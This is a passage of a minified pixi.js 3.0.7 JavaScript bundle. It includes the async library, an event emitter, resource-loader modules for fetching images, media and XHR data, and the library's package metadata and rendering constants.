n=o?o+t:t;if(!this._events||!this._events[n])return this;var s=this._events[n],a=[];if(e)if(s.fn)(s.fn!==e||i&&!s.once||r&&s.context!==r)&&a.push(s);else for(var h=0,l=s.length;l>h;h++)(s[h].fn!==e||i&&!s[h].once||r&&s[h].context!==r)&&a.push(s[h]);return a.length?this._events[n]=1===a.length?a[0]:a:delete this._events[n],this},n.prototype.removeAllListeners=function(t){return this._events?(t?delete this._events[o?o+t:t]:this._events=o?{}:Object.create(null),this):this},n.prototype.off=n.prototype.removeListener,n.prototype.addListener=n.prototype.on,n.prototype.setMaxListeners=function(){return this},n.prefixed=o,e.exports=n},{}],12:[function(t,e,r){"use strict";function i(t){if(null==t)throw new TypeError("Object.assign cannot be called with null or undefined");return Object(t)}e.exports=Object.assign||function(t,e){for(var r,n,o=i(t),s=1;s<arguments.length;s++){r=arguments[s],n=Object.keys(Object(r));for(var a=0;a<n.length;a++)o[n[a]]=r[n[a]]}return o}},{}],13:[function(e,r,i){(function(e){!function(){function i(t){var e=!1;return function(){if(e)throw new Error("Callback was already called.");e=!0,t.apply(n,arguments)}}var n,o,s={};n=this,null!=n&&(o=n.async),s.noConflict=function(){return n.async=o,s};var a=Object.prototype.toString,h=Array.isArray||function(t){return"[object Array]"===a.call(t)},l=function(t,e){if(t.forEach)return t.forEach(e);for(var r=0;r<t.length;r+=1)e(t[r],r,t)},u=function(t,e){if(t.map)return t.map(e);var r=[];return l(t,function(t,i,n){r.push(e(t,i,n))}),r},c=function(t,e,r){return t.reduce?t.reduce(e,r):(l(t,function(t,i,n){r=e(r,t,i,n)}),r)},p=function(t){if(Object.keys)return Object.keys(t);var e=[];for(var r in t)t.hasOwnProperty(r)&&e.push(r);return e};"undefined"!=typeof e&&e.nextTick?(s.nextTick=e.nextTick,s.setImmediate="undefined"!=typeof setImmediate?function(t){setImmediate(t)}:s.nextTick):"function"==typeof setImmediate?(s.nextTick=function(t){setImmediate(t)},s.setImmediate=s.nextTick):(s.nextTick=function(t){setTimeout(t,0)},s.setImmediate=s.nextTick),s.each=function(t,e,r){function n(e){e?(r(e),r=function(){}):(o+=1,o>=t.length&&r())}if(r=r||function(){},!t.length)return r();var o=0;l(t,function(t){e(t,i(n))})},s.forEach=s.each,s.eachSeries=function(t,e,r){if(r=r||function(){},!t.length)return r();var i=0,n=function(){e(t[i],function(e){e?(r(e),r=function(){}):(i+=1,i>=t.length?r():n())})};n()},s.forEachSeries=s.eachSeries,s.eachLimit=function(t,e,r,i){var n=d(e);n.apply(null,[t,r,i])},s.forEachLimit=s.eachLimit;var d=function(t){return function(e,r,i){if(i=i||function(){},!e.length||0>=t)return i();var n=0,o=0,s=0;!function a(){if(n>=e.length)return i();for(;t>s&&o<e.length;)o+=1,s+=1,r(e[o-1],function(t){t?(i(t),i=function(){}):(n+=1,s-=1,n>=e.length?i():a())})}()}},f=function(t){return function(){var e=Array.prototype.slice.call(arguments);return t.apply(null,[s.each].concat(e))}},v=function(t,e){return function(){var r=Array.prototype.slice.call(arguments);return e.apply(null,[d(t)].concat(r))}},g=function(t){return function(){var e=Array.prototype.slice.call(arguments);return t.apply(null,[s.eachSeries].concat(e))}},m=function(t,e,r,i){if(e=u(e,function(t,e){return{index:e,value:t}}),i){var n=[];t(e,function(t,e){r(t.value,function(r,i){n[t.index]=i,e(r)})},function(t){i(t,n)})}else t(e,function(t,e){r(t.value,function(t){e(t)})})};s.map=f(m),s.mapSeries=g(m),s.mapLimit=function(t,e,r,i){return y(e)(t,r,i)};var y=function(t){return v(t,m)};s.reduce=function(t,e,r,i){s.eachSeries(t,function(t,i){r(e,t,function(t,r){e=r,i(t)})},function(t){i(t,e)})},s.inject=s.reduce,s.foldl=s.reduce,s.reduceRight=function(t,e,r,i){var n=u(t,function(t){return t}).reverse();s.reduce(n,e,r,i)},s.foldr=s.reduceRight;var x=function(t,e,r,i){var n=[];e=u(e,function(t,e){return{index:e,value:t}}),t(e,function(t,e){r(t.value,function(r){r&&n.push(t),e()})},function(t){i(u(n.sort(function(t,e){return t.index-e.index}),function(t){return t.value}))})};s.filter=f(x),s.filterSeries=g(x),s.select=s.filter,s.selectSeries=s.filterSeries;var b=function(t,e,r,i){var n=[];e=u(e,function(t,e){return{index:e,value:t}}),t(e,function(t,e){r(t.value,function(r){r||n.push(t),e()})},function(t){i(u(n.sort(function(t,e){return t.index-e.index}),function(t){return t.value}))})};s.reject=f(b),s.rejectSeries=g(b);var _=function(t,e,r,i){t(e,function(t,e){r(t,function(r){r?(i(t),i=function(){}):e()})},function(t){i()})};s.detect=f(_),s.detectSeries=g(_),s.some=function(t,e,r){s.each(t,function(t,i){e(t,function(t){t&&(r(!0),r=function(){}),i()})},function(t){r(!1)})},s.any=s.some,s.every=function(t,e,r){s.each(t,function(t,i){e(t,function(t){t||(r(!1),r=function(){}),i()})},function(t){r(!0)})},s.all=s.every,s.sortBy=function(t,e,r){s.map(t,function(t,r){e(t,function(e,i){e?r(e):r(null,{value:t,criteria:i})})},function(t,e){if(t)return r(t);var i=function(t,e){var r=t.criteria,i=e.criteria;return i>r?-1:r>i?1:0};r(null,u(e.sort(i),function(t){return t.value}))})},s.auto=function(t,e){e=e||function(){};var r=p(t),i=r.length;if(!i)return e();var n={},o=[],a=function(t){o.unshift(t)},u=function(t){for(var e=0;e<o.length;e+=1)if(o[e]===t)return void o.splice(e,1)},d=function(){i--,l(o.slice(0),function(t){t()})};a(function(){if(!i){var t=e;e=function(){},t(null,n)}}),l(r,function(r){var i=h(t[r])?t[r]:[t[r]],o=function(t){var i=Array.prototype.slice.call(arguments,1);if(i.length<=1&&(i=i[0]),t){var o={};l(p(n),function(t){o[t]=n[t]}),o[r]=i,e(t,o),e=function(){}}else n[r]=i,s.setImmediate(d)},f=i.slice(0,Math.abs(i.length-1))||[],v=function(){return c(f,function(t,e){return t&&n.hasOwnProperty(e)},!0)&&!n.hasOwnProperty(r)};if(v())i[i.length-1](o,n);else{var g=function(){v()&&(u(g),i[i.length-1](o,n))};a(g)}})},s.retry=function(t,e,r){var i=5,n=[];"function"==typeof t&&(r=e,e=t,t=i),t=parseInt(t,10)||i;var o=function(i,o){for(var a=function(t,e){return function(r){t(function(t,i){r(!t||e,{err:t,result:i})},o)}};t;)n.push(a(e,!(t-=1)));s.series(n,function(t,e){e=e[e.length-1],(i||r)(e.err,e.result)})};return r?o():o},s.waterfall=function(t,e){if(e=e||function(){},!h(t)){var r=new Error("First argument to waterfall must be an array of functions");return e(r)}if(!t.length)return e();var i=function(t){return function(r){if(r)e.apply(null,arguments),e=function(){};else{var n=Array.prototype.slice.call(arguments,1),o=t.next();n.push(o?i(o):e),s.setImmediate(function(){t.apply(null,n)})}}};i(s.iterator(t))()};var T=function(t,e,r){if(r=r||function(){},h(e))t.map(e,function(t,e){t&&t(function(t){var r=Array.prototype.slice.call(arguments,1);r.length<=1&&(r=r[0]),e.call(null,t,r)})},r);else{var i={};t.each(p(e),function(t,r){e[t](function(e){var n=Array.prototype.slice.call(arguments,1);n.length<=1&&(n=n[0]),i[t]=n,r(e)})},function(t){r(t,i)})}};s.parallel=function(t,e){T({map:s.map,each:s.each},t,e)},s.parallelLimit=function(t,e,r){T({map:y(e),each:d(e)},t,r)},s.series=function(t,e){if(e=e||function(){},h(t))s.mapSeries(t,function(t,e){t&&t(function(t){var r=Array.prototype.slice.call(arguments,1);r.length<=1&&(r=r[0]),e.call(null,t,r)})},e);else{var r={};s.eachSeries(p(t),function(e,i){t[e](function(t){var n=Array.prototype.slice.call(arguments,1);n.length<=1&&(n=n[0]),r[e]=n,i(t)})},function(t){e(t,r)})}},s.iterator=function(t){var e=function(r){var i=function(){return t.length&&t[r].apply(null,arguments),i.next()};return i.next=function(){return r<t.length-1?e(r+1):null},i};return e(0)},s.apply=function(t){var e=Array.prototype.slice.call(arguments,1);return function(){return t.apply(null,e.concat(Array.prototype.slice.call(arguments)))}};var E=function(t,e,r,i){var n=[];t(e,function(t,e){r(t,function(t,r){n=n.concat(r||[]),e(t)})},function(t){i(t,n)})};s.concat=f(E),s.concatSeries=g(E),s.whilst=function(t,e,r){t()?e(function(i){return i?r(i):void s.whilst(t,e,r)}):r()},s.doWhilst=function(t,e,r){t(function(i){if(i)return r(i);var n=Array.prototype.slice.call(arguments,1);e.apply(null,n)?s.doWhilst(t,e,r):r()})},s.until=function(t,e,r){t()?r():e(function(i){return i?r(i):void s.until(t,e,r)})},s.doUntil=function(t,e,r){t(function(i){if(i)return r(i);var n=Array.prototype.slice.call(arguments,1);e.apply(null,n)?r():s.doUntil(t,e,r)})},s.queue=function(t,e){function r(t,e,r,i){return t.started||(t.started=!0),h(e)||(e=[e]),0==e.length?s.setImmediate(function(){t.drain&&t.drain()}):void l(e,function(e){var n={data:e,callback:"function"==typeof i?i:null};r?t.tasks.unshift(n):t.tasks.push(n),t.saturated&&t.tasks.length===t.concurrency&&t.saturated(),s.setImmediate(t.process)})}void 0===e&&(e=1);var n=0,o={tasks:[],concurrency:e,saturated:null,empty:null,drain:null,started:!1,paused:!1,push:function(t,e){r(o,t,!1,e)},kill:function(){o.drain=null,o.tasks=[]},unshift:function(t,e){r(o,t,!0,e)},process:function(){if(!o.paused&&n<o.concurrency&&o.tasks.length){var e=o.tasks.shift();o.empty&&0===o.tasks.length&&o.empty(),n+=1;var r=function(){n-=1,e.callback&&e.callback.apply(e,arguments),o.drain&&o.tasks.length+n===0&&o.drain(),o.process()},s=i(r);t(e.data,s)}},length:function(){return o.tasks.length},running:function(){return n},idle:function(){return o.tasks.length+n===0},pause:function(){o.paused!==!0&&(o.paused=!0,o.process())},resume:function(){o.paused!==!1&&(o.paused=!1,o.process())}};return o},s.priorityQueue=function(t,e){function r(t,e){return t.priority-e.priority}function i(t,e,r){for(var i=-1,n=t.length-1;n>i;){var o=i+(n-i+1>>>1);r(e,t[o])>=0?i=o:n=o-1}return i}function n(t,e,n,o){return t.started||(t.started=!0),h(e)||(e=[e]),0==e.length?s.setImmediate(function(){t.drain&&t.drain()}):void l(e,function(e){var a={data:e,priority:n,callback:"function"==typeof o?o:null};t.tasks.splice(i(t.tasks,a,r)+1,0,a),t.saturated&&t.tasks.length===t.concurrency&&t.saturated(),s.setImmediate(t.process)})}var o=s.queue(t,e);return o.push=function(t,e,r){n(o,t,e,r)},delete o.unshift,o},s.cargo=function(t,e){var r=!1,i=[],n={tasks:i,payload:e,saturated:null,empty:null,drain:null,drained:!0,push:function(t,r){h(t)||(t=[t]),l(t,function(t){i.push({data:t,callback:"function"==typeof r?r:null}),n.drained=!1,n.saturated&&i.length===e&&n.saturated()}),s.setImmediate(n.process)},process:function o(){if(!r){if(0===i.length)return n.drain&&!n.drained&&n.drain(),void(n.drained=!0);var s="number"==typeof e?i.splice(0,e):i.splice(0,i.length),a=u(s,function(t){return t.data});n.empty&&n.empty(),r=!0,t(a,function(){r=!1;var t=arguments;l(s,function(e){e.callback&&e.callback.apply(null,t)}),o()})}},length:function(){return i.length},running:function(){return r}};return n};var S=function(t){return function(e){var r=Array.prototype.slice.call(arguments,1);e.apply(null,r.concat([function(e){var r=Array.prototype.slice.call(arguments,1);"undefined"!=typeof console&&(e?console.error&&console.error(e):console[t]&&l(r,function(e){console[t](e)}))}]))}};s.log=S("log"),s.dir=S("dir"),s.memoize=function(t,e){var r={},i={};e=e||function(t){return t};var n=function(){var n=Array.prototype.slice.call(arguments),o=n.pop(),a=e.apply(null,n);a in r?s.nextTick(function(){o.apply(null,r[a])}):a in i?i[a].push(o):(i[a]=[o],t.apply(null,n.concat([function(){r[a]=arguments;var t=i[a];delete i[a];for(var e=0,n=t.length;n>e;e++)t[e].apply(null,arguments)}])))};return n.memo=r,n.unmemoized=t,n},s.unmemoize=function(t){return function(){return(t.unmemoized||t).apply(null,arguments)}},s.times=function(t,e,r){for(var i=[],n=0;t>n;n++)i.push(n);return s.map(i,e,r)},s.timesSeries=function(t,e,r){for(var i=[],n=0;t>n;n++)i.push(n);return s.mapSeries(i,e,r)},s.seq=function(){var t=arguments;return function(){var e=this,r=Array.prototype.slice.call(arguments),i=r.pop();s.reduce(t,r,function(t,r,i){r.apply(e,t.concat([function(){var t=arguments[0],e=Array.prototype.slice.call(arguments,1);i(t,e)}]))},function(t,r){i.apply(e,[t].concat(r))})}},s.compose=function(){return s.seq.apply(null,Array.prototype.reverse.call(arguments))};var A=function(t,e){var r=function(){var r=this,i=Array.prototype.slice.call(arguments),n=i.pop();return t(e,function(t,e){t.apply(r,i.concat([e]))},n)};if(arguments.length>2){var i=Array.prototype.slice.call(arguments,2);return r.apply(this,i)}return r};s.applyEach=f(A),s.applyEachSeries=g(A),s.forever=function(t,e){function r(i){if(i){if(e)return e(i);throw i}t(r)}r()},"undefined"!=typeof r&&r.exports?r.exports=s:"undefined"!=typeof t&&t.amd?t([],function(){return s}):n.async=s}()}).call(this,e("_process"))},{_process:4}],14:[function(t,e,r){arguments[4][11][0].apply(r,arguments)},{dup:11}],15:[function(t,e,r){function i(t,e){a.call(this),e=e||10,this.baseUrl=t||"",this.progress=0,this.loading=!1,this._progressChunk=0,this._beforeMiddleware=[],this._afterMiddleware=[],this._boundLoadResource=this._loadResource.bind(this),this._boundOnLoad=this._onLoad.bind(this),this._buffer=[],this._numToLoad=0,this._queue=n.queue(this._boundLoadResource,e),this.resources={}}var n=t("async"),o=t("url"),s=t("./Resource"),a=t("eventemitter3");i.prototype=Object.create(a.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.add=i.prototype.enqueue=function(t,e,r,i){if(Array.isArray(t)){for(var n=0;n<t.length;++n)this.add(t[n]);return this}if("object"==typeof t&&(i=e||t.callback||t.onComplete,r=t,e=t.url,t=t.name||t.key||t.url),"string"!=typeof e&&(i=r,r=e,e=t),"string"!=typeof e)throw new Error("No url passed to add resource to loader.");if("function"==typeof r&&(i=r,r=null),this.resources[t])throw new Error('Resource with name "'+t+'" already exists.');return e=this._handleBaseUrl(e),this.resources[t]=new s(t,e,r),"function"==typeof i&&this.resources[t].once("afterMiddleware",i),this._numToLoad++,this._queue.started?(this._queue.push(this.resources[t]),this._progressChunk=(100-this.progress)/(this._queue.length()+this._queue.running())):(this._buffer.push(this.resources[t]),this._progressChunk=100/this._buffer.length),this},i.prototype._handleBaseUrl=function(t){var e=o.parse(t);return e.protocol||0===e.pathname.indexOf("//")?t:this.baseUrl.length&&this.baseUrl.lastIndexOf("/")!==this.baseUrl.length-1&&t.lastIndexOf("/")!==t.length-1?this.baseUrl+"/"+t:this.baseUrl+t},i.prototype.before=i.prototype.pre=function(t){return this._beforeMiddleware.push(t),this},i.prototype.after=i.prototype.use=function(t){return this._afterMiddleware.push(t),this},i.prototype.reset=function(){this.progress=0,this.loading=!1,this._progressChunk=0,this._buffer.length=0,this._numToLoad=0,this._queue.kill(),this._queue.started=!1,this.resources={}},i.prototype.load=function(t){if("function"==typeof t&&this.once("complete",t),this._queue.started)return this;this.emit("start",this);for(var e=0;e<this._buffer.length;++e)this._queue.push(this._buffer[e]);return this._buffer.length=0,this},i.prototype._loadResource=function(t,e){var r=this;t._dequeue=e,this._runMiddleware(t,this._beforeMiddleware,function(){t.load(r._boundOnLoad)})},i.prototype._onComplete=function(){this.emit("complete",this,this.resources)},i.prototype._onLoad=function(t){this.progress+=this._progressChunk,this.emit("progress",this,t),t.error?this.emit("error",t.error,this,t):this.emit("load",this,t),this._runMiddleware(t,this._afterMiddleware,function(){t.emit("afterMiddleware",t),this._numToLoad--,0===this._numToLoad&&this._onComplete()}),t._dequeue()},i.prototype._runMiddleware=function(t,e,r){var i=this;n.eachSeries(e,function(e,r){e.call(i,t,r)},r.bind(this,t))},i.LOAD_TYPE=s.LOAD_TYPE,i.XHR_READY_STATE=s.XHR_READY_STATE,i.XHR_RESPONSE_TYPE=s.XHR_RESPONSE_TYPE},{"./Resource":16,async:13,eventemitter3:14,url:9}],16:[function(t,e,r){function i(t,e,r){if(s.call(this),r=r||{},"string"!=typeof t||"string"!=typeof e)throw new Error("Both name and url are required for constructing a resource.");this.name=t,this.url=e,this.isDataUrl=0===this.url.indexOf("data:"),this.data=null,this.crossOrigin=r.crossOrigin===!0?"anonymous":null,this.loadType=r.loadType||this._determineLoadType(),this.xhrType=r.xhrType,this.error=null,this.xhr=null,this.isJson=!1,this.isXml=!1,this.isImage=!1,this.isAudio=!1,this.isVideo=!1,this._dequeue=null,this._boundComplete=this.complete.bind(this),this._boundOnError=this._onError.bind(this),this._boundOnProgress=this._onProgress.bind(this),this._boundXhrOnError=this._xhrOnError.bind(this),this._boundXhrOnAbort=this._xhrOnAbort.bind(this),this._boundXhrOnLoad=this._xhrOnLoad.bind(this),this._boundXdrOnTimeout=this._xdrOnTimeout.bind(this)}function n(t){return t.toString().replace("object ","")}function o(t,e,r){e&&0===e.indexOf(".")&&(e=e.substring(1)),e&&(t[e]=r)}var s=t("eventemitter3"),a=t("url"),h=!(!window.XDomainRequest||"withCredentials"in new XMLHttpRequest),l=null;i.prototype=Object.create(s.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.complete=function(){this.data&&this.data.removeEventListener&&(this.data.removeEventListener("error",this._boundOnError),this.data.removeEventListener("load",this._boundComplete),this.data.removeEventListener("progress",this._boundOnProgress),this.data.removeEventListener("canplaythrough",this._boundComplete)),this.xhr&&(this.xhr.removeEventListener?(this.xhr.removeEventListener("error",this._boundXhrOnError),this.xhr.removeEventListener("abort",this._boundXhrOnAbort),this.xhr.removeEventListener("progress",this._boundOnProgress),this.xhr.removeEventListener("load",this._boundXhrOnLoad)):(this.xhr.onerror=null,this.xhr.ontimeout=null,this.xhr.onprogress=null,this.xhr.onload=null)),this.emit("complete",this)},i.prototype.load=function(t){switch(this.emit("start",this),t&&this.once("complete",t),"string"!=typeof this.crossOrigin&&(this.crossOrigin=this._determineCrossOrigin(this.url)),this.loadType){case i.LOAD_TYPE.IMAGE:this._loadImage();break;case i.LOAD_TYPE.AUDIO:this._loadElement("audio");break;case i.LOAD_TYPE.VIDEO:this._loadElement("video");break;case i.LOAD_TYPE.XHR:default:h&&this.crossOrigin?this._loadXdr():this._loadXhr()}},i.prototype._loadImage=function(){this.data=new Image,this.crossOrigin&&(this.data.crossOrigin=this.crossOrigin),this.data.src=this.url,this.isImage=!0,this.data.addEventListener("error",this._boundOnError,!1),this.data.addEventListener("load",this._boundComplete,!1),this.data.addEventListener("progress",this._boundOnProgress,!1)},i.prototype._loadElement=function(t){if(this.data=document.createElement(t),Array.isArray(this.url))for(var e=0;e<this.url.length;++e)this.data.appendChild(this._createSource(t,this.url[e]));else this.data.appendChild(this._createSource(t,this.url));this["is"+t[0].toUpperCase()+t.substring(1)]=!0,this.data.addEventListener("error",this._boundOnError,!1),this.data.addEventListener("load",this._boundComplete,!1),this.data.addEventListener("progress",this._boundOnProgress,!1),this.data.addEventListener("canplaythrough",this._boundComplete,!1),this.data.load()},i.prototype._loadXhr=function(){"string"!=typeof this.xhrType&&(this.xhrType=this._determineXhrType());var t=this.xhr=new XMLHttpRequest;t.open("GET",this.url,!0),t.responseType=this.xhrType===i.XHR_RESPONSE_TYPE.JSON||this.xhrType===i.XHR_RESPONSE_TYPE.DOCUMENT?i.XHR_RESPONSE_TYPE.TEXT:this.xhrType,t.addEventListener("error",this._boundXhrOnError,!1),t.addEventListener("abort",this._boundXhrOnAbort,!1),t.addEventListener("progress",this._boundOnProgress,!1),t.addEventListener("load",this._boundXhrOnLoad,!1),t.send()},i.prototype._loadXdr=function(){"string"!=typeof this.xhrType&&(this.xhrType=this._determineXhrType());var t=this.xhr=new XDomainRequest;t.timeout=5e3,t.onerror=this._boundXhrOnError,t.ontimeout=this._boundXdrOnTimeout,t.onprogress=this._boundOnProgress,t.onload=this._boundXhrOnLoad,t.open("GET",this.url,!0),setTimeout(function(){t.send()},0)},i.prototype._createSource=function(t,e,r){r||(r=t+"/"+e.substr(e.lastIndexOf(".")+1));var i=document.createElement("source");return i.src=e,i.type=r,i},i.prototype._onError=function(t){this.error=new Error("Failed to load element using "+t.target.nodeName),this.complete()},i.prototype._onProgress=function(t){t&&t.lengthComputable&&this.emit("progress",this,t.loaded/t.total)},i.prototype._xhrOnError=function(){this.error=new Error(n(this.xhr)+" Request failed. Status: "+this.xhr.status+', text: "'+this.xhr.statusText+'"'),this.complete()},i.prototype._xhrOnAbort=function(){this.error=new Error(n(this.xhr)+" Request was aborted by the user."),this.complete()},i.prototype._xdrOnTimeout=function(){this.error=new Error(n(this.xhr)+" Request timed out."),this.complete()},i.prototype._xhrOnLoad=function(){var t=this.xhr,e=void 0!==t.status?t.status:200;if(200===e||204===e||0===e&&t.responseText.length>0)if(this.xhrType===i.XHR_RESPONSE_TYPE.TEXT)this.data=t.responseText;else if(this.xhrType===i.XHR_RESPONSE_TYPE.JSON)try{this.data=JSON.parse(t.responseText),this.isJson=!0}catch(r){this.error=new Error("Error trying to parse loaded json:",r)}else if(this.xhrType===i.XHR_RESPONSE_TYPE.DOCUMENT)try{if(window.DOMParser){var n=new DOMParser;this.data=n.parseFromString(t.responseText,"text/xml")}else{var o=document.createElement("div");o.innerHTML=t.responseText,this.data=o}this.isXml=!0}catch(r){this.error=new Error("Error trying to parse loaded xml:",r)}else this.data=t.response||t.responseText;else this.error=new Error("["+t.status+"]"+t.statusText+":"+t.responseURL);this.complete()},i.prototype._determineCrossOrigin=function(t,e){if(0===t.indexOf("data:"))return"";e=e||window.location,l||(l=document.createElement("a")),l.href=t,t=a.parse(l.href);var r=!t.port&&""===e.port||t.port===e.port;return t.hostname===e.hostname&&r&&t.protocol===e.protocol?"":"anonymous"},i.prototype._determineXhrType=function(){return i._xhrTypeMap[this._getExtension()]||i.XHR_RESPONSE_TYPE.TEXT},i.prototype._determineLoadType=function(){return i._loadTypeMap[this._getExtension()]||i.LOAD_TYPE.XHR},i.prototype._getExtension=function(){var t,e=this.url;if(this.isDataUrl){var r=e.indexOf("/");t=e.substring(r+1,e.indexOf(";",r))}else{var i=e.indexOf("?");-1!==i&&(e=e.substring(0,i)),t=e.substring(e.lastIndexOf(".")+1)}return t},i.prototype._getMimeFromXhrType=function(t){switch(t){case i.XHR_RESPONSE_TYPE.BUFFER:return"application/octet-binary";case i.XHR_RESPONSE_TYPE.BLOB:return"application/blob";case i.XHR_RESPONSE_TYPE.DOCUMENT:return"application/xml";case i.XHR_RESPONSE_TYPE.JSON:return"application/json";case i.XHR_RESPONSE_TYPE.DEFAULT:case i.XHR_RESPONSE_TYPE.TEXT:default:return"text/plain"}},i.LOAD_TYPE={XHR:1,IMAGE:2,AUDIO:3,VIDEO:4},i.XHR_READY_STATE={UNSENT:0,OPENED:1,HEADERS_RECEIVED:2,LOADING:3,DONE:4},i.XHR_RESPONSE_TYPE={DEFAULT:"text",BUFFER:"arraybuffer",BLOB:"blob",DOCUMENT:"document",JSON:"json",TEXT:"text"},i._loadTypeMap={gif:i.LOAD_TYPE.IMAGE,png:i.LOAD_TYPE.IMAGE,bmp:i.LOAD_TYPE.IMAGE,jpg:i.LOAD_TYPE.IMAGE,jpeg:i.LOAD_TYPE.IMAGE,tif:i.LOAD_TYPE.IMAGE,tiff:i.LOAD_TYPE.IMAGE,webp:i.LOAD_TYPE.IMAGE,tga:i.LOAD_TYPE.IMAGE},i._xhrTypeMap={xhtml:i.XHR_RESPONSE_TYPE.DOCUMENT,html:i.XHR_RESPONSE_TYPE.DOCUMENT,htm:i.XHR_RESPONSE_TYPE.DOCUMENT,xml:i.XHR_RESPONSE_TYPE.DOCUMENT,tmx:i.XHR_RESPONSE_TYPE.DOCUMENT,tsx:i.XHR_RESPONSE_TYPE.DOCUMENT,svg:i.XHR_RESPONSE_TYPE.DOCUMENT,gif:i.XHR_RESPONSE_TYPE.BLOB,png:i.XHR_RESPONSE_TYPE.BLOB,bmp:i.XHR_RESPONSE_TYPE.BLOB,jpg:i.XHR_RESPONSE_TYPE.BLOB,jpeg:i.XHR_RESPONSE_TYPE.BLOB,tif:i.XHR_RESPONSE_TYPE.BLOB,tiff:i.XHR_RESPONSE_TYPE.BLOB,webp:i.XHR_RESPONSE_TYPE.BLOB,tga:i.XHR_RESPONSE_TYPE.BLOB,json:i.XHR_RESPONSE_TYPE.JSON,text:i.XHR_RESPONSE_TYPE.TEXT,txt:i.XHR_RESPONSE_TYPE.TEXT},i.setExtensionLoadType=function(t,e){o(i._loadTypeMap,t,e)},i.setExtensionXhrType=function(t,e){o(i._xhrTypeMap,t,e)}},{eventemitter3:14,url:9}],17:[function(t,e,r){e.exports={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encodeBinary:function(t){for(var e,r="",i=new Array(4),n=0,o=0,s=0;n<t.length;){for(e=new Array(3),o=0;o<e.length;o++)e[o]=n<t.length?255&t.charCodeAt(n++):0;switch(i[0]=e[0]>>2,i[1]=(3&e[0])<<4|e[1]>>4,i[2]=(15&e[1])<<2|e[2]>>6,i[3]=63&e[2],s=n-(t.length-1)){case 2:i[3]=64,i[2]=64;break;case 1:i[3]=64}for(o=0;o<i.length;o++)r+=this._keyStr.charAt(i[o])}return r}}},{}],18:[function(t,e,r){e.exports=t("./Loader"),e.exports.Resource=t("./Resource"),e.exports.middleware={caching:{memory:t("./middlewares/caching/memory")},parsing:{blob:t("./middlewares/parsing/blob")}}},{"./Loader":15,"./Resource":16,"./middlewares/caching/memory":19,"./middlewares/parsing/blob":20}],19:[function(t,e,r){var i={};e.exports=function(){return function(t,e){i[t.url]?(t.data=i[t.url],t.complete()):(t.once("complete",function(){i[this.url]=this.data}),e())}}},{}],20:[function(t,e,r){var i=t("../../Resource"),n=t("../../b64");window.URL=window.URL||window.webkitURL,e.exports=function(){return function(t,e){if(!t.data)return e();if(t.xhr&&t.xhrType===i.XHR_RESPONSE_TYPE.BLOB)if(window.Blob&&"string"!=typeof t.data){if(0===t.data.type.indexOf("image")){var r=URL.createObjectURL(t.data);t.blob=t.data,t.data=new Image,t.data.src=r,t.isImage=!0,t.data.onload=function(){URL.revokeObjectURL(r),t.data.onload=null,e()}}}else{var o=t.xhr.getResponseHeader("content-type");o&&0===o.indexOf("image")&&(t.data=new Image,t.data.src="data:"+o+";base64,"+n.encodeBinary(t.xhr.responseText),t.isImage=!0,t.data.onload=function(){t.data.onload=null,e()})}else e()}}},{"../../Resource":16,"../../b64":17}],21:[function(t,e,r){e.exports={name:"pixi.js",version:"3.0.7",description:"Pixi.js is a fast lightweight 2D library that works across all devices.",author:"Mat Groves",contributors:["Chad Engler <chad@pantherdev.com>","Richard Davey <rdavey@gmail.com>"],main:"./src/index.js",homepage:"http://goodboydigital.com/",bugs:"https://github.com/GoodBoyDigital/pixi.js/issues",license:"MIT",repository:{type:"git",url:"https://github.com/GoodBoyDigital/pixi.js.git"},scripts:{start:"gulp && gulp watch",test:"gulp && testem ci",build:"gulp",docs:"jsdoc -c ./gulp/util/jsdoc.conf.json -R README.md"},files:["bin/","src/"],dependencies:{async:"^0.9.0",brfs:"^1.4.0",earcut:"^2.0.1",eventemitter3:"^1.1.0","object-assign":"^2.0.0","resource-loader":"^1.6.1"},devDependencies:{browserify:"^10.2.3",chai:"^3.0.0",del:"^1.2.0",gulp:"^3.9.0","gulp-cached":"^1.1.0","gulp-concat":"^2.5.2","gulp-debug":"^2.0.1","gulp-jshint":"^1.11.0","gulp-mirror":"^0.4.0","gulp-plumber":"^1.0.1","gulp-rename":"^1.2.2","gulp-sourcemaps":"^1.5.2","gulp-uglify":"^1.2.0","gulp-util":"^3.0.5","jaguarjs-jsdoc":"git+https://github.com/davidshimjs/jaguarjs-jsdoc.git",jsdoc:"^3.3.0","jshint-summary":"^0.4.0",minimist:"^1.1.1",mocha:"^2.2.5","require-dir":"^0.3.0","run-sequence":"^1.1.0",testem:"^0.8.3","vinyl-buffer":"^1.0.0","vinyl-source-stream":"^1.1.0",watchify:"^3.2.1"},browserify:{transform:["brfs"]}}},{}],22:[function(t,e,r){var i={VERSION:t("../../package.json").version,PI_2:2*Math.PI,RAD_TO_DEG:180/Math.PI,DEG_TO_RAD:Math.PI/180,TARGET_FPMS:.06,RENDERER_TYPE:{UNKNOWN:0,WEBGL:1,CANVAS:2},BLEND_MODES:{NORMAL:0,ADD:1,MULTIPLY:2,SCREEN:3,OVERLAY:4,DARKEN:5,LIGHTEN:6,COLOR_DODGE:7,COLOR_BURN:8,HARD_LIGHT:9,SOFT_LIGHT:10,DIFFERENCE:11,EXCLUSION:12,HUE:13,SATURATION:14,COLOR:15,LUMINOSITY:16},DRAW_MODES:{POINTS:0,LINES:1,LINE_LOOP:2,LINE_STRIP:3,TRIANGLES:4,TRIANGLE_STRIP:5,TRIANGLE_FAN:6},SCALE_MODES:{DEFAULT:0,LINEAR:0,NEAREST:1},RETINA_PREFIX:/@(.+)x/,RESOLUTION:1,FILTER_RESOLUTION:1,DEFAULT_RENDER_OPTIONS:{view:null,resolution:1,antialias:!1,forceFXAA:!1,autoResize:!1,transparent:!1,backgroundColor:0,clearBeforeRender:!0,preserveDrawingBuffer:!1},SHAPES:{POLY:0,RECT:1,CIRC:2,ELIP:3,RREC:4},SPRITE_BATCH_SIZE:2e3};e.exports=i},{"../../package.json":21}],23:[function(t,e,r){function i(){o.call(this),this.children=[]}var n=t("../math"),o=t("./DisplayObject"),s=t("../textures/RenderTexture"),a=new n.Matrix;i.prototype=Object.create(o.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{width:{get:function(){return this.scale.x*this.getLocalBounds().width},set:function(t){var e=this.getLocalBounds().width;this.scale.x=0!==e?t/e:1,this._width=t}},height:{get:function(){return this.scale.y*this.getLocalBounds().height},set:function(t){var 